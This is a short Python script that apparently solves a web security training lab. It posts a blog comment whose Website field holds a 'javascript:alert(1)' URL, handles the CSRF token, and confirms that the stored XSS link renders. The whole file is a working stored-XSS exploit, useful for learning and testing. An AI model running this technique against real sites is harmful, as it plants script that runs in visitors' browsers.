import argparse
import re
import requests

# Stored XSS into an anchor href with double quotes HTML-encoded. The comment
# "Website" field is stored and rendered as the author's link href. The quote is
# encoded (no attribute breakout), but an href is a URL context, so a javascript:
# scheme value executes when the link is clicked. This script posts a comment with
# website=javascript:alert(1) (fetching the postId + csrf token first) and confirms
# the javascript: href is stored. The alert fires when the link is clicked.

parser = argparse.ArgumentParser(description="Solve XSS lab 8 (stored into anchor href, quotes encoded)")
parser.add_argument("lab_url", help="Lab URL (https://0a...web-security-academy.net)")
parser.add_argument("--post", default="1", help="Blog postId to comment on")
parser.add_argument("--payload", default="javascript:alert(1)", help="javascript: URL for the Website field")
args = parser.parse_args()

lab_url = args.lab_url.rstrip("/")
post_path = f"/post?postId={args.post}"

s = requests.Session()

# grab the per-session anti-CSRF token from the comment form
post_page = s.get(lab_url + post_path).text
m = re.search(r'name="csrf" value="([^"]+)"', post_page)
if not m:
    print("[!] Couldn't find the csrf token on the post page; check the postId.")
    raise SystemExit(1)
csrf = m.group(1)

print(f"[*] Posting comment with website={args.payload} ...")
s.post(lab_url + "/post/comment", data={
    "csrf": csrf,
    "postId": args.post,
    "comment": "nice post",
    "name": "attacker",
    "email": "attacker@evil.com",
    "website": args.payload,
})

# confirm the javascript: href is stored on the rendered post
if f'href="{args.payload}"' in s.get(lab_url + post_path).text:
    print(f"[+] Stored author link href = {args.payload}")
    print("[+] Clicking the comment's author name runs the JS -> alert fires in a browser.")
else:
    print("[!] javascript: href not found; the scheme may be filtered or the field differs.")

if "is-solved" in s.get(lab_url + "/").text:
    print("[+] Lab solved!")
else:
    print(f"[!] Not marked solved yet - open {lab_url}{post_path} and click the comment author's name.")
